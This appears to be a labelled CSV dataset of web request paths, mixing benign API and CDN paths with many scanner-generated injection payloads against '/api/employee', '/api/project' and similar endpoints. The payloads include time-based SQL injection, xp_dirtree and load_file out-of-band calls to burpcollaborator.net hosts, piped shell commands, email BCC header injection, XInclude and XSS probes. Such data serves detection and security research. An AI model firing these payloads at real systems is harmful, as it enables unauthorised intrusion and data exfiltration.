requestUrl,encoder,mode_is
/api/admin/kaihua/inspection/todoList' and (select*from(select(sleep(20)))a)-- ,345,0
/api/admin/kaihua/inspection/todoList'(select*from(select(sleep(20)))a)',346,0
/api/admin/kaihua/inspection/todoList');declare @q varchar(99);set @q='\\8irnujled1ae9r2f53f8hcnjoau8izbn2fp5du.burpcollab'+'orator.net\rot'; exec master.dbo.xp_dirtree @q;-- ,347,0
/api/admin/kaihua/inspection/todoList')waitfor delay'0:0:20'--,348,0
"/api/admin/kaihua/inspection/todoList'+(function(){if(typeof cm2sl===""undefined""){var a=new Date();do{var b=new Date();}while(b-a<20000);cm2sl=1;}}())+'",349,0
"/api/admin/kaihua/inspection/todoList'+(function(){if(typeof ydgyy===""undefined""){var a=new Date();do{var b=new Date();}while(b-a<20000);ydgyy=1;}}())+'",350,0
/api/admin/kaihua/inspection/todoList'.sleep(20).',351,0
/api/admin/kaihua/inspection/todoList';declare @q varchar(99);set @q='\\xmncy8p3hqe3dg649sjxl1r8szyxmodc44rufj.burpcollab'+'orator.net\iss'; exec master.dbo.xp_dirtree @q;-- ,352,0
/api/admin/kaihua/inspection/todoList'|echo b1ef5og4fq nb544dnfb2 #xzwx,353,0
/api/admin/kaihua/inspection/todoList'|echo gkov6ulpy4 cabnvv8qs0 #xzwx,354,0
"/api/admin/kaihua/inspection/todoList,(select*from(select(sleep(20)))a)",355,0
/api/admin/kaihua/inspection/todoList24748071' or '4167'='4167,356,0
/api/admin/kaihua/inspection/todoList;declare @q varchar(99);set @q='\\fm5uyqplh8eldy6m9ajfljrqshygm7cv3nqde2.burpcollab'+'orator.net\rza'; exec master.dbo.xp_dirtree @q;-- ,357,0
"/api/admin/kaihua/inspection/todoList>
BCC:0abfmbd65t261ju7xv7094fbg2m0as4gv8iy6n@burpcollaborator.net
aiy: n",358,0
"/api/admin/kaihua/inspection/todoList>
BCC:5y4kag1btyqbpoicl0v5x93g47a6yysmje64ut@burpcollaborator.net
rrv: m",359,0
"/api/admin/kaihua/inspection/todoListle188%>lw9ul'/""<mnc6x",360,0
/api/admin/kaihua/inspection/todoList|ping -c 21 127.0.0.1||x,361,0
"/api/admin/kaihua/inspection/todoList|ping -n 21 127.0.0.1||`ping -c 21 127.0.0.1` #' |ping -n 21 127.0.0.1||`ping -c 21 127.0.0.1` #\"" |ping -n 21 127.0.0.1",362,0
/api/admin/kaihua/inspection|ping -c 21 127.0.0.1||x/,363,0
"/api/admin/kaihua|ping -n 21 127.0.0.1||`ping -c 21 127.0.0.1` #' |ping -n 21 127.0.0.1||`ping -c 21 127.0.0.1` #\"" |ping -n 21 127.0.0.1/",364,0
/api/admin/public/(select extractvalue(xmltype('<,365,0
"/api/admin/public/<ray xmlns:xi=""http://www.w3.org/2001/XInclude""><xi:include href=""http://r6y6i29x1kyxxaqytm3r5vb2ctiv6wunmacy1.burpcollaborator.net/foo""/></ray>",366,0
/api/admin/public/addInformationAndGetId,367,0
"/api/admin/public/addInformationAndGetId""|ping -n 21 127.0.0.1 ||",368,0
/api/admin/public/addInformationAndGetId'(select*from(select(sleep(20)))a)',369,0
/api/admin/public/addInformationAndGetId'+(select load_file('\\\\m7u1jxas2fzsy5rtuh4m6qcxdojo7fa31volca.burpcollaborator.net\\kpz'))+',370,0
/api/admin/public/addInformationAndGetId'+(select*from(select(sleep(20)))a)+',371,0
/api/admin/public/addInformationAndGetId';declare @q varchar(99);set @q='\\2orh0dr8jvg8fl89bxl2n6tdu404ovfj6bt1hq.burpcollab'+'orator.net\cld'; exec master.dbo.xp_dirtree @q;-- ,372,0
/api/admin/public/addInformationAndGetId'|echo qrv4zvb5y0 ak8oxqei9n #xzwx,373,0
/api/admin/public/gateInfo,374,0
/api/admin/public/generateQrImg,375,0
"/api/admin/public/generateQrImg
BCC:bkzqwmnhf4chbu4i76hbjfpmqdwfk7dv4nrdf2@burpcollaborator.net
xcb: t",376,0
"/api/admin/public/generateQrImg""|echo qywd84e5f4 nzvzbttl55 ||",377,0
/api/admin/public/generateQrImg');declare @q varchar(99);set @q='\\ao2p0lrgj3ggft8hb5lanetluc0eo5ht8lvbj0.burpcollab'+'orator.net\dyw'; exec master.dbo.xp_dirtree @q;-- ,378,0
/api/admin/public/generateQrImg'+(select*from(select(sleep(20)))a)+',379,0
/api/admin/public/generateQrImg'.sleep(20).',380,0
/api/admin/public/generateQrImg'|ping -c 21 127.0.0.1 #,381,0
"/api/admin/public/generateQrImg|echo 82grgkngn2 y2d4i085rv||a #' |echo 82grgkngn2 y2d4i085rv||a #|"" |echo 82grgkngn2 y2d4i085rv||a #",382,0
"/api/admin/public/javascript:/*</script><svg/onload='+/""/+/onmouseover=1/+/[*/[]/+((new(Image)).src=([]+/\/pun460xvpimvl8ewhkrpttz00r6tull9c1zrng\.burpcollaborator.net/).replace(/\\/g,[]))//'>",383,0
/api/adp/stat,384,0
/api/appbox/getUserAppByJson,385,0
/api/appbox/queryNotifyByJson,386,0
/api/auth/jwt/token,387,1
/api/brandScd/getBrandScd.php,388,0
/api/clientlog/mam/upload,389,0
/api/cloud/course/chapter/videos,390,0
/api/cube.server/batchStat,391,0
/api/detect/v1/cases/89/hackerProfiles/29/photo,392,0
/api/employee,393,0
"/api/employee
BCC:3sw70nt6rxelkki2fclqz7ftbkhe5dt5mtdl0bo0@burpcollaborator.net
sit: u",394,0
"/api/employee""|echo acgwfyzslo pv71bir7en ||",395,0
"/api/employee""|ping -n 21 127.0.0.1 ||",396,0
/api/employee' and (select*from(select(sleep(20)))a)-- ,397,0
/api/employee'(select*from(select(sleep(20)))a)',398,0
/api/employee');declare @q varchar(99);set @q='\\vkjzsflyjp6dccau74dirz7l3c96x0lref57sxgm.burpcollab'+'orator.net\luk'; exec master.dbo.xp_dirtree @q;-- ,399,0
"/api/employee'+(function(){if(typeof hp8pc===""undefined""){var a=new Date();do{var b=new Date();}while(b-a<20000);hp8pc=1;}}())+'",400,0
"/api/employee'+(function(){if(typeof i1c7p===""undefined""){var a=new Date();do{var b=new Date();}while(b-a<20000);i1c7p=1;}}())+'",401,0
"/api/employee'+(function(){if(typeof tdt1g===""undefined""){var a=new Date();do{var b=new Date();}while(b-a<20000);tdt1g=1;}}())+'",402,0
"/api/employee'+(function(){if(typeof wnrq2===""undefined""){var a=new Date();do{var b=new Date();}while(b-a<20000);wnrq2=1;}}())+'",403,0
/api/employee'+(select load_file('\\\\2ps6xmq5owbkhjf1cbipw6cs8jed27qytmke74vt.burpcollaborator.net\\xca'))+',404,0
/api/employee'+(select*from(select(sleep(20)))a)+',405,0
"/api/employee'+eval(compile('for x in range(1):\n import time\n time.sleep(20)','a','single'))+'",406,0
/api/employee'.sleep(20).',407,0
/api/employee';declare @q varchar(99);set @q='\\7z7b7r0ay1lprop6mgsu6bmxiooicg07rvin5dt2.burpcollab'+'orator.net\lfg'; exec master.dbo.xp_dirtree @q;-- ,408,0
/api/employee';declare @q varchar(99);set @q='\\jf2nn3gmed11705i2s86mn29y04usogf73yvll9a.burpcollab'+'orator.net\zpo'; exec master.dbo.xp_dirtree @q;-- ,409,0
/api/employee'|echo 7eblidis9o zn1j9rgz95 #xzwx,410,0
/api/employee'|echo ixjzfews56 lvd18n2zy1 #xzwx,411,0
/api/employee'|echo luw4ggn9lk vsz5kj3r9o #xzwx,412,0
/api/employee'|ping -c 21 127.0.0.1 #,413,0
/api/employee'||(select extractvalue(xmltype('<,414,0
"/api/employee>
BCC:4kp8sol7jy6mcla37ddrr87u3l9fx7lzfn6ft5hu@burpcollaborator.net
tju: v",415,0
"/api/employee>
BCC:ap3exuqdo4bshrf9cjixwec08rel2fq7kvbnydm2@burpcollaborator.net
ecs: m",416,0
"/api/employee|echo ejixm5u9ai kbtahj9xq4||a #' |echo ejixm5u9ai kbtahj9xq4||a #|"" |echo ejixm5u9ai kbtahj9xq4||a #",417,0
"/api/employee|echo r89cwwzvsh uyzfa8zwmc||a #' |echo r89cwwzvsh uyzfa8zwmc||a #|"" |echo r89cwwzvsh uyzfa8zwmc||a #",418,0
/api/employee|ping -c 21 127.0.0.1||x,419,0
"/api/employee|ping -n 21 127.0.0.1||`ping -c 21 127.0.0.1` #' |ping -n 21 127.0.0.1||`ping -c 21 127.0.0.1` #\"" |ping -n 21 127.0.0.1",420,0
/api/expert/v1/files,421,0
/api/faq.php,422,0
/api/feed/profile/v1/,423,0
/api/feedback/client/log,424,0
/api/filediff,425,0
/api/filemetas,426,0
/api/json/alarm/listAlarms,427,0
/api/layout/getTemplates,428,0
/api/log/mam/upload,429,0
/api/log/track,430,0
/api/news/feed/v88/,431,0
/api/popup/lotus.php,432,0
"/api/project
BCC:fo7jwzpin9axgweeboh2vjb57wdq1rpji7fu6iv@burpcollaborator.net
ewl: f/view",433,0
"/api/project""|echo j7spgn4v36 hfppyz6vc7 ||/view",434,0
"/api/project""|echo r2ikxx06ye ye9iu9oner ||/view",435,0
/api/project' and (select*from(select(sleep(20)))a)-- /view,436,0
/api/project');declare @q varchar(99);set @q='\\4x285oy7wyjmpln3kdqr48kuglmga6yxrlo8fw4.burpcollab'+'orator.net\mlc'; exec master.dbo.xp_dirtree @q;-- /page,437,0
/api/project');declare @q varchar(99);set @q='\\5gm9oph8fz2n8m643e9sn93vzm5gtbh2aq7dy1n.burpcollab'+'orator.net\phj'; exec master.dbo.xp_dirtree @q;-- /view,438,0
/api/project');declare @q varchar(99);set @q='\\xjk1rhk0ir5fbe9w66ckq16n2e88w1ksdga31rq.burpcollab'+'orator.net\lmy'; exec master.dbo.xp_dirtree @q;-- /view,439,0
"/api/project'+(function(){if(typeof q7s2b===""undefined""){var a=new Date();do{var b=new Date();}while(b-a<20000);q7s2b=1;}}())+'/view",440,0
/api/project'+(select load_file('\\\\615a9q2900notnr5ofut8aowknqhei295x2kt8i.burpcollaborator.net\\kaq'))+'/view,441,0
/api/project'+(select load_file('\\\\w1y09g2z0qnetdrvo5uj80omkdq7e72y5m29txi.burpcollaborator.net\\qrl'))+'/view,442,0
/api/project'+(select*from(select(sleep(20)))a)+'/page,443,0
/api/project'+(select*from(select(sleep(20)))a)+'/view,444,0
"/api/project'+eval(compile('for x in range(1):\n import time\n time.sleep(20)','a','single'))+'/view",445,0
/api/project'+sleep(20.to_i)+'/view,446,0
/api/project'.sleep(20).'/view,447,0
/api/project';declare @q varchar(99);set @q='\\zlo3tjm2kt7hdgby88ems38p4gaay3mudia51tq.burpcollab'+'orator.net\qfc'; exec master.dbo.xp_dirtree @q;-- /view,448,0
/api/project'|echo ydzp179ybk oovm9s0mca #xzwx/view,449,0
/api/project'|ping -c 21 127.0.0.1 #/view,450,0
/api/project'||(select extractvalue(xmltype('<,451,0
"/api/project,(select*from(select(sleep(20)))a)/view",452,0
/api/project/(select extractvalue(xmltype('<,453,0
"/api/project/<coh xmlns:xi=""http://www.w3.org/2001/XInclude""><xi:include href=""http://f0gj8z1iz9mxswqenot27jn5jwpqdr1spjh67uw.burpcollaborator.net/foo""/></coh>",454,0
"/api/project/<wkm xmlns:xi=""http://www.w3.org/2001/XInclude""><xi:include href=""http://67bafq8960toznx5uf0teauwqnwhkh8iw9owek3.burpcollaborator.net/foo""/></wkm>",455,0
"/api/project/javascript:/*</script><img/onerror='-/""/-/ onmouseover=1/-/[`*/[]/[(new(Image)).src=(/;/+/y652ei715ssgyfwxt7zld2topfvaj07sygp8cy0nX;.burpcollaborator.net/).replace(/.;/g,[])]//'src=>",456,0
/api/project/page,457,0
/api/project/page' and (select*from(select(sleep(20)))a)-- ,458,0
/api/project/page'+(select load_file('\\\\jpcnx3qmodb1h0ficsi6wnc980ev2lqct0ks7iv7.burpcollaborator.net\\zqe'))+',459,0
/api/project/page'+(select*from(select(sleep(20)))a)+',460,0
"/api/project/page'+eval(compile('for x in range(1):\n import time\n time.sleep(20)','a','single'))+'",461,0
/api/project/page'+sleep(20.to_i)+',462,0
/api/project/page'|ping -c 21 127.0.0.1 #,463,0
/api/project/page'||(select extractvalue(xmltype('<,464,0
"/api/project/page>
BCC:kbzoj4cnaex2311jyt47ioyau10womce62xukk89@burpcollaborator.net
cui: g",465,0
"/api/project/page|ping -n 21 127.0.0.1||`ping -c 21 127.0.0.1` #' |ping -n 21 127.0.0.1||`ping -c 21 127.0.0.1` #\"" |ping -n 21 127.0.0.1",466,0
/api/project/view,467,0
"/api/project/view
BCC:guek20vjtagymxkfhpn31kh6dxjr7mveo2fu2kq9@burpcollaborator.net
hjh: n",468,0
"/api/project/view
BCC:itfm12ulscf0lzjhgrm50mg8czit6tuln9e11rpg@burpcollaborator.net
hyk: f",469,0
"/api/project/view""|echo 33dn39pes2 te7rf6xk6i ||",470,0
"/api/project/view""|echo taf19s5qyg tehel3ldi3 ||",471,0
"/api/project/view""|ping -n 21 127.0.0.1 ||",472,0
/api/project/view' and (select*from(select(sleep(20)))a)-- ,473,0
/api/project/view'(select*from(select(sleep(20)))a)',474,0
"/api/project/view'+(function(){if(typeof bsbw3===""undefined""){var a=new Date();do{var b=new Date();}while(b-a<20000);bsbw3=1;}}())+'",475,0
"/api/project/view'+(function(){if(typeof ornia===""undefined""){var a=new Date();do{var b=new Date();}while(b-a<20000);ornia=1;}}())+'",476,0
"/api/project/view'+(function(){if(typeof ugbba===""undefined""){var a=new Date();do{var b=new Date();}while(b-a<20000);ugbba=1;}}())+'",477,0
/api/project/view'+(select load_file('\\\\1df5lle4cvzj5i300a6ok50rwi2cq5ewhk8cv2jr.burpcollaborator.net\\its'))+',478,0
/api/project/view'+(select load_file('\\\\xtu11hu0srfflejwg6mk01gncei869u0xoogb6zv.burpcollaborator.net\\jud'))+',479,0
"/api/project/view'+eval(compile('for x in range(1):\n import time\n time.sleep(20)','a','single'))+'",480,0
/api/project/view'+sleep(20.to_i)+',481,0
/api/project/view'.sleep(20).',482,0
/api/project/view';declare @q varchar(99);set @q='\\ds9h0xtgr7evkuicfml0zhf3buho5jtakybqygm5.burpcollab'+'orator.net\ilk'; exec master.dbo.xp_dirtree @q;-- ,483,0
/api/project/view'|echo 2mo6p6lk9u m0yexy3bnt #xzwx,484,0
/api/project/view'|ping -c 21 127.0.0.1 #,485,0
/api/project/view'||(select extractvalue(xmltype('<,486,0
"/api/project/view>
BCC:5369bp482zpnvmt4qewsa9qvmmsggg48ywpoce03@burpcollaborator.net
kfi: n",487,0
"/api/project/view>
BCC:8ircqsjbh24qap875hbvpc5y1p7jvej6du4mrcf1@burpcollaborator.net
gqa: r",488,0
"/api/project/view|echo md0u3tfk41 c99u8gfy99||a #' |echo md0u3tfk41 c99u8gfy99||a #|"" |echo md0u3tfk41 c99u8gfy99||a #",489,0
"/api/project/view|echo n6cndgji34 xgy3qa3b7b||a #' |echo n6cndgji34 xgy3qa3b7b||a #|"" |echo n6cndgji34 xgy3qa3b7b||a #",490,0
/api/project/view|ping -c 21 127.0.0.1||x,491,0
"/api/project/view|ping -n 21 127.0.0.1||`ping -c 21 127.0.0.1` #' |ping -n 21 127.0.0.1||`ping -c 21 127.0.0.1` #\"" |ping -n 21 127.0.0.1",492,0
"/api/project|echo 6ob98sbesc i1p8wikspb||a #' |echo 6ob98sbesc i1p8wikspb||a #|"" |echo 6ob98sbesc i1p8wikspb||a #/view",493,0
"/api/project|echo 9jygjq6rf5 3z69p6uw9b||a #' |echo 9jygjq6rf5 3z69p6uw9b||a #|"" |echo 9jygjq6rf5 3z69p6uw9b||a #/view",494,0
/api/project|ping -c 21 127.0.0.1||x/view,495,0
"/api/project|ping -n 21 127.0.0.1||`ping -c 21 127.0.0.1` #' |ping -n 21 127.0.0.1||`ping -c 21 127.0.0.1` #\"" |ping -n 21 127.0.0.1/view",496,0
/api/quota,497,0
/api/report,498,0
/api/resources/VMware Workstation 64位_15.0.2.40550.exe,499,0
/api/resources/软件/解压工具/BANDIZIP-SETUP.EXE,500,0
/api/route/pps/user/action,501,0
/api/rtm/v1/risk/import,502,0
"/api/sendVerifyCode
BCC:xpq1xhq0orbfhefwc6ikw1cn8ee824qwjkg77vw@burpcollaborator.net
bcn: y/getVerifyCode",503,0
/api/sendVerifyCode' and (select*from(select(sleep(20)))a)-- /getVerifyCode,504,0
/api/sendVerifyCode');declare @q varchar(99);set @q='\\1jl5rlk4iv5jbi906acoq56r2i8cw8kzdnaa1yq.burpcollab'+'orator.net\axn'; exec master.dbo.xp_dirtree @q;-- /getVerifyCode,505,0
"/api/sendVerifyCode'+(function(){if(typeof wk9ai===""undefined""){var a=new Date();do{var b=new Date();}while(b-a<20000);wk9ai=1;}}())+'/getVerifyCode",506,0
/api/sendVerifyCode'|ping -c 21 127.0.0.1 #/getVerifyCode,507,0
/api/sendVerifyCode'||(select extractvalue(xmltype('<,508,0
/api/sendVerifyCode);declare @q varchar(99);set @q='\\4di8loe7cyzm5l330d6rk80uwl2fqbe26q3du1j.burpcollab'+'orator.net\ajb'; exec master.dbo.xp_dirtree @q;-- /getVerifyCode,509,0
/api/sendVerifyCode/(select extractvalue(xmltype('<,510,0
/api/sendVerifyCode/getVerifyCode,511,0
"/api/sendVerifyCode/getVerifyCode""|ping -n 21 127.0.0.1 ||",512,0
"/api/sendVerifyCode/getVerifyCode&nslookup -q=cname darhixbg97wv2u0cxm30hhx3tuzonkbfz6rthh6.burpcollaborator.net.&'\""`0&nslookup -q=cname darhixbg97wv2u0cxm30hhx3tuzonkbfz6rthh6.burpcollaborator.net.&`'",513,0
/api/sendVerifyCode/getVerifyCode' and (select*from(select(sleep(20)))a)-- ,514,0
/api/sendVerifyCode/getVerifyCode');declare @q varchar(99);set @q='\\l4qpc55o3fq3w2ukrux8bprbn2twhs5jy7pzcp0e.burpcollab'+'orator.net\vwr'; exec master.dbo.xp_dirtree @q;-- ,515,0
"/api/sendVerifyCode/getVerifyCode'+(function(){if(typeof va70b===""undefined""){var a=new Date();do{var b=new Date();}while(b-a<20000);va70b=1;}}())+'",516,0
/api/sendVerifyCode/getVerifyCode'+sleep(20.to_i)+',517,0
/api/sendVerifyCode/getVerifyCode'.sleep(20).',518,0
/api/sendVerifyCode/getVerifyCode'|echo v0wuad1uke m87cg9s5cq #xzwx,519,0
/api/sendVerifyCode/getVerifyCode;declare @q varchar(99);set @q='\\40288o17zymmslq3ndtr78nujlpfdb12rqii58tx.burpcollab'+'orator.net\ttk'; exec master.dbo.xp_dirtree @q;-- ,520,0
/api/sendVerifyCode/getVerifyCodealert(1),521,0
/api/sendVerifyCode;declare @q varchar(99);set @q='\\q5wuda6t4kr8x7vpszydcusgo7u1ix6owctzkn9.burpcollab'+'orator.net\nea'; exec master.dbo.xp_dirtree @q;-- /getVerifyCode,522,0
"/api/sendVerifyCode>
BCC:fp8jxzqio9bxhwfecoi2wjc58weq2mqek2hp8dx@burpcollaborator.net
kvx: j/getVerifyCode",523,0
/api/setting/v1/upload/license,524,0
/api/sms_check.php,525,0
/api/solr/{{core}}/select,526,0
/api/stat/rt/js,527,0
/api/trans/vip/translate,528,0
/api/v2/check,529,0
/api/v3/get,530,0
/api/v7/loadInfo,531,0
/api/wls-wsat/CoordinatorPortType,532,0
"/api>
BCC:7z7b7r0ay1lprop6mgsu6bmxiooicg08uwrjh76@burpcollaborator.net
mbx: m/employee",533,0
"/api>
BCC:geykm0fjda0y6x4f1p73lk16xx3rrkfc906nwbl@burpcollaborator.net
nyt: i/project/view",534,0
"/api>
BCC:kpdox4qnoeb2h1fjcti7woca81ev2xqpkdh07ow@burpcollaborator.net
zlj: w/sendVerifyCode/getVerifyCode",535,0
"/api>
BCC:q8zuga9t7ku807ypvz1dfuvgr7x1lx9p3d00qof@burpcollaborator.net
hdj: t/sendVerifyCode/getVerifyCode",536,0
"/api>
BCC:wnn0vgozmq9efddva5gju0am6dc706oyimf95xu@burpcollaborator.net
ynb: m/employee",537,0
"/api>
BCC:ytv21iu1ssfglfjxg7ml02gocfia60usogl3br0@burpcollaborator.net
odr: a/project/page",538,0
/apialert(1)lkugge/project/view,539,0
/apialert(1)nwbp4m/project/view,540,0
/apialert(1)zxp02e/project/view,541,0
/apis/mbd/v2/upload.action,542,0
/apis/qiyirc/getrc.php,543,0
/apis/qiyirc/setrc,544,0
"/api|echo 5zfspdwplk upu9nxayk6||a #' |echo 5zfspdwplk upu9nxayk6||a #|"" |echo 5zfspdwplk upu9nxayk6||a #/employee",545,0
"/api|echo ayp26j4x82 nixphoeejy||a #' |echo ayp26j4x82 nixphoeejy||a #|"" |echo ayp26j4x82 nixphoeejy||a #/employee",546,0
"/api|echo d6ickmx9xu g4td22fuy2||a #' |echo d6ickmx9xu g4td22fuy2||a #|"" |echo d6ickmx9xu g4td22fuy2||a #/project/view",547,0
"/api|echo t02cj6vo0x a169q36yqn||a #' |echo t02cj6vo0x a169q36yqn||a #|"" |echo t02cj6vo0x a169q36yqn||a #/project/view",548,0
/api|ping -c 21 127.0.0.1||x/project/view,549,0
/api|ping -c 21 127.0.0.1||x/sendVerifyCode/getVerifyCode,550,0
"/api|ping -n 21 127.0.0.1||`ping -c 21 127.0.0.1` #' |ping -n 21 127.0.0.1||`ping -c 21 127.0.0.1` #\"" |ping -n 21 127.0.0.1/project/page",551,0
"/api|ping -n 21 127.0.0.1||`ping -c 21 127.0.0.1` #' |ping -n 21 127.0.0.1||`ping -c 21 127.0.0.1` #\"" |ping -n 21 127.0.0.1/project/view",552,0
/app.php,553,0
/app/analyze/newperformance,554,0
/app/cStart/start/cold/v1/get,555,0
/app/customChannel,556,0
/app/player,557,0
/app/re/upgrade/cloudPlugin/v3/get,558,0
/app_logs,559,0
/appeal/list.jsp,560,0
/apps/log.html,561,0
/assets/components/phpthumb/phpThumb.php,562,0
/assets/flash/zeroclipboard/ZeroClipboard.swf,563,0
/assets/js/zeroclipboard/ZeroClipboard.swf,564,0
/assets/scripts/amcolumn.swf,565,0
/assets/swf/zeroclipboard/ZeroClipboard.swf,566,0
/av,567,0
/b,568,0
/badjs,569,0
/baiducdncnc.inter.iqiyi.com/cdn/pcclient/20200217/7.2.48.3850/c9d8b1e81a0e6391a74bb4ab28cb90d2/tvg.zip,570,0
/baiducdncnc.inter.iqiyi.com/videos/v0/20190605/fa/23/b33718ae980b75b21e1bd30595f82d12.265ts,571,0
/baiducdncnc.inter.iqiyi.com/videos/v0/20200220/63/44/271e53485e7df668e3312ecb71aa0f49.f4v,572,0
/baiducdncnc.inter.iqiyi.com/videos/v1/20190916/af/3b/d02c60b29e82bbb55b7173fb100a33a2.f4v,573,0
/baiducdncnc.inter.iqiyi.com/videos/v1/20200217/15/ab/d0d3bfc1b87c4e591c7670890656404a.f4v,574,0
/baiducdnct.inter.iqiyi.com/videos/other/20200211/f1/ba/e72ce2eb2c84b3ca4a6f3bc2fd40262e.mp4,575,0
/baiducdnct.inter.iqiyi.com/videos/other/20200212/3c/1c/64988b8545da9d2130bd09a15608a21a.mp4,576,0
/baiducdnct.inter.iqiyi.com/videos/other/20200219/52/3f/e4ff44d37f032d121b75540d95a377e4.mp4,577,0
/baiducdnct.inter.iqiyi.com/videos/v0/20190923/bb/66/35bda9e13fcca1fb588a37ead91b3f28.265ts,578,0
/baiducdnct.inter.iqiyi.com/videos/v0/20191102/21/f7/8d40fd3b7b5c8abac0571fae1c867ef0.m4s,579,0
/baiducdnct.inter.iqiyi.com/videos/v0/20191224/f9/24/5ceb77b204d304612d7ca5ae3575adc0.mp4,580,0
/baiducdnct.inter.iqiyi.com/videos/v0/20191227/21/c2/503d4ec04b77d0a84a3b654272e30248.mp4,581,0
/baiducdnct.inter.iqiyi.com/videos/v0/20191227/37/2b/f2408a3302d71cec5b795089be58e95e.265ts,582,0
/baiducdnct.inter.iqiyi.com/videos/v0/20191228/4e/5d/631180cfbf4678ad69392139ae4728ef.265ts,583,0
/baiducdnct.inter.iqiyi.com/videos/v0/20191228/bc/b7/9727ab0a1b520206fc307a4f3bab4823.265ts,584,0
/baiducdnct.inter.iqiyi.com/videos/v0/20191231/1e/88/208528ac3b0904d71c38ad417dd88a99.265ts,585,0
/baiducdnct.inter.iqiyi.com/videos/v0/20200101/34/03/96865a09bb3cab9b5886b4269a0cb033.265ts,586,0
/baiducdnct.inter.iqiyi.com/videos/v0/20200101/f8/4f/a4899c03d95abd7795bba7e91525d1dc.265ts,587,0
/baiducdnct.inter.iqiyi.com/videos/v0/20200117/c6/62/25b77e322991256cb8b35444a44686df.265ts,588,0
/baiducdnct.inter.iqiyi.com/videos/v0/20200121/9f/52/bf8ad19f13755e2a24d5758d3d1ed996.265ts,589,0
/baiducdnct.inter.iqiyi.com/videos/v0/20200121/e2/12/f2f6b3769636663519ea50e9f70c43c9.265ts,590,0
/baiducdnct.inter.iqiyi.com/videos/v0/20200121/e2/12/f3b28c77a0fa057902000aec6156bd5e.265ts,591,0
/baiducdnct.inter.iqiyi.com/videos/v0/20200123/be/7f/b68e92b7c25f10e68920bfc0d823a7aa.265ts,592,0
/baiducdnct.inter.iqiyi.com/videos/v0/20200201/1e/93/24ae8b133cd9f6b6f086e9d3d7a22819.265ts,593,0
/baiducdnct.inter.iqiyi.com/videos/v0/20200201/89/67/86ef27f8f0256e0b44275bb1a034e82d.265ts,594,0
/baiducdnct.inter.iqiyi.com/videos/v0/20200201/89/67/eb5d760f4b7736dbcb5757411242c15d.265ts,595,0
/baiducdnct.inter.iqiyi.com/videos/v0/20200212/3d/ab/b58205954f29e437191fa03805a99b23.265ts,596,0
/baiducdnct.inter.iqiyi.com/videos/v0/20200213/41/aa/8ab7eb78a7e65293da49ccbf4576951d.265ts,597,0
/baiducdnct.inter.iqiyi.com/videos/v0/20200213/41/aa/fde5cb5de670bd48578dc95fe9f3091c.265ts,598,0
/baiducdnct.inter.iqiyi.com/videos/v0/20200213/4a/31/531f4d4ee269fda29bbac662c3f8fb60.amp4,599,0
/baiducdnct.inter.iqiyi.com/videos/v0/20200213/54/be/acfe3772fc21b203bdbd387ac01e17c4.amp4,600,0
/baiducdnct.inter.iqiyi.com/videos/v0/20200213/a5/d4/dc75be83d21445997ec3a3c4eb4b7e8e.265ts,601,0
/baiducdnct.inter.iqiyi.com/videos/v0/20200213/a5/d4/f4b37ccba1a41dd07712f882ef98a1e7.265ts,602,0
/baiducdnct.inter.iqiyi.com/videos/v0/20200214/6a/20/6f82b1e3e568dd37096fde754a78bce3.mp4,603,0
